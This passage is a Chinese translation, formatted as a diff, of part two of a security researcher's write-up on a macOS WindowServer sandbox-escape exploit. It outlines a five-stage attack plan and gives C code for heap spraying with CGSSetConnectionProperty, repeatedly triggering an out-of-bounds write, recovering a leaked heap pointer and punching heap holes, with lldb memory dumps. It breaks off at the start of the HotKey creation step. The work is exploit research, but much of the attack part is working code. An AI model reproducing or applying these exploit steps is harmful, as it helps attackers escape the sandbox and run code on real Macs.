@@ -1,0 +1,94 @@
+原文：
+在本文的上篇中，我们给出了相应的POC，并介绍了现有漏洞的局限性。接着，介绍了用于发现与我们的漏洞兼容的破坏目标的工具和技术，在本文中，我们将为读者详细介绍更多的内容。
+**行动计划**
+* * *
+最终，我们的沙箱逃逸过程可以分为五个不同的阶段：
+  1. （利用我们的漏洞）泄漏WindowServer MALLOC_TINY堆底部附近的地址
+  2. （利用我们的漏洞）通过仔细选择并修整跨块破坏对象，创建一个悬空的HotKey
+  3. 使用悬空HotKey对象破坏CFStringRef指针
+  4. 使用objc_msgSend()技术来劫持控制流，进而实现任意代码执行
+  5. 清理现场并继续执行
+本文的其余部分将详细介绍以上所述的各个步骤。
+**泄漏堆布局**
+* * *
+沙箱逃逸的第一阶段，旨在泄漏WindowServer堆布局的相关信息。虽然这一步并不是绝对必要的，但泄漏的堆指针能够提供一些态势感知信息，从而提高漏洞利用的速度和可靠性。
+在这一步中，首先需要使用CGSSetConnectionProperty()向WindowServer的MALLOC_TINY堆中喷射500,000个左右的CFString对象：
+    for(int i = start; i < end; i++)
+        {
+            CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, spray_id, i);
+            CGSSetConnectionProperty(g_cid, g_cid, key_name, corruptor_cfs);
+            CFRelease(key_name);
+            if(i % 1000000 == 0 && i) { printf("[*] - Completed %u\n", i); }
+        }
+对于这些喷射的字符串来说，除了中间仅有的一个[0x400] DWORD外，其他部分都是用NULL字节进行填充的。由于这里满足 [ 0x400 ] [
+0x0000000000000000 ]约束，从而有效地创建了一个小“hook”，借助它，我们的越界写入就不会造成任何意外的破坏了。
+    (lldb) x/124gx 0x7ff0b7910160 --force
+    0x7ff0b7910160: 0x001dffff91812551 0x0000000100000788
+    0x7ff0b7910170: 0x00000000000003c6 0x0000000000000000
+    0x7ff0b7910180: 0x0000000000000000 0x0000000000000000
+    ...
+    0x7ff0b7910500: 0x0000000000000000 0x0000000000000000
+    0x7ff0b7910510: 0x0000000000000000 0x0000040000000000 <-- 'hook' to catch a write
+    0x7ff0b7910520: 0x0000000000000000 0x0000000000000000
+    0x7ff0b7910530: 0x0000000000000000 0x0000000000000000
+从任意选择（但有问题的）的索引0xFFEDFFC0开始，我们的漏洞利用代码将尝试通过SLPSRegisterForKeyOnConnection()来多次触发该bug，同时令有问题的索引不断递增。重复这一过程，直到抓住其中一个“hook”并成功完成写入为止，从而有效地“破坏”我们喷射的字符串：
+    current_index = starting_index + i;
+        result = SLPSRegisterForKeyOnConnection(g_cid, &psn, current_index, 1);
+        printf("[*] Attempted buggy write @ 0x%08X: %u\n", current_index, result);
+        // a non-zero return code means the write did not occur
+        if(result)
+            continue;
+使用lldb转储被破坏的分配空间后，我们发现，成功触发漏洞会将“未知堆指针”+ ConnectionID写入到一个喷射的连接属性中。
+    (lldb) x/124gx 0x7ff0b7910160 --force
+    0x7ff0b7910160: 0x001dffff91812551 0x0000000100000788
+    0x7ff0b7910170: 0x00000000000003c6 0x0000000000000000
+    0x7ff0b7910180: 0x0000000000000000 0x0000000000000000
+    ...
+    0x7ff0b7910500: 0x0000000000000000 0x0000000000000000
+    0x7ff0b7910510: 0x0000000000000000 0x0000040000000000 <-- 'hook' to catch a write
+    0x7ff0b7910520: 0x00007ff0b9438e20 0x0000000000007313 <-- [unknown_ptr (8 bytes)] [CID (4 bytes)]
+    0x7ff0b7910530: 0x0000000000000000 0x0000000000000000
+通过CoreGraphics提供的CGSCopyConnectionProperty()API，我们能够从WindowServer请求喷射的所有连接属性字符串。通过搜索每个字符串的内容，我们的漏洞利用代码最终会找到包含被泄漏的指针的、自身已被破坏的属性：
+    for(int i = start; i < end && found < length; i++)
+        {
+            // request a connection property back from the windowserver
+            CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, LEAK_SPRAY_ID, i);
+            CGSCopyConnectionProperty(g_cid, g_cid, key_name, &valuePtr);
+            CFRelease(key_name);
+            // convert the received string to raw bytes
+            CFStringGetBytes(valuePtr, range, kCFStringEncodingISOLatin1, 0, true, (UInt8*)key_value, CORRUPTOR_SIZE, &got);
+            CFRelease(valuePtr);
+            // check for the presence of a leak
+            leak = ((uint64_t*)&key_value[CORRUPTOR_SIZE-6-24]);
+            if(*leak != 0)
+            {
+                *leaked = *leak;
+                keys[found++] = (uint32_t)i;
+            }
+        }
+虽然我们没有太多时间来研究这个指针的真正用途，但不难发现，MALLOC_TINY堆的末端位于一个新的WindowServer实例中。同时，我们还注意到MALLOC_TINY堆很可能是以大小为256mb的块“向后扩展”。
+这样的话，我们不仅能预测漏洞利用代码的分配空间相对于泄漏的指针的位置，同时，还能计算喷射数据端点的近似位置：
+第一阶段使用漏洞与堆喷射来泄漏堆指针
+借助对堆布局及其增长方式的了解，可以进一步使用我们的漏洞完成更加恶毒的内存破坏活动。
+**HotKey风水**
+* * *
+漏洞利用第二阶段的目标，是部分破坏WindowServer
+HotKey指针，以使它指向我们可以任意控制的堆数据中的某个位置。这需要执行一系列精心设计的堆操作，并在进行跨块破坏时冒险尝试创建一个悬空的HotKey指针。
+首先，使用（在第一阶段中泄漏的）堆指针来计算第二阶段所需的最佳喷射大小（范围在1-4gb之间）。其实，之所以要计算喷射大小，是为了覆盖我们期望悬空的HotKey指针所在的地址。当然，这是基于这样一个假设，即我们在喷射中途为可破坏的HotKey对象分配内存空间。
+泄漏的堆指针帮助我们预测在第二阶段何时分配对象
+就像第一阶段一样，第二阶段喷射的大多是内容为NULL的连接属性字符串。在喷射的中途，我们的漏洞将停止检查堆，以求找到分配空间直接相邻的属性字符串。找到相邻value的分配空间（即，它们之间没有key字符串）是至关重要的，因为这是我们要执行的跨块破坏的内存空间的边界。
+识别出几个相邻的分配空间对后，我们可以使用CGSSetConnectionProperty()释放每对中的后面那个，注意，这里value参数的值取NULL。这样的话，就能够有效地释放WindowServer中指定的连接属性value的分配空间，从而实现为堆“打孔”的目的：
+    void punch_hotkey_holes(unsigned int * hotkey_keys, size_t length)
+    {
+        for(int i = 0; i < length; i++)
+        {
+            // we want to punch a hole AFTER the string we probed (hence +1)
+            int hole_index = hotkey_keys[i] + 1;
+            CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, hole_index);
+            CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
+            CFRelease(key_name);
+        }
+    }
+在第二阶段的上半段通过喷射NULL字符串进行打孔
+在释放了一些精心选择的NULL字符串块之后，我们的漏洞利用代码将立即着手创建HotKey对象，以期能够填充我们打出来的一个或多个孔：
+    void create_hotkeys()
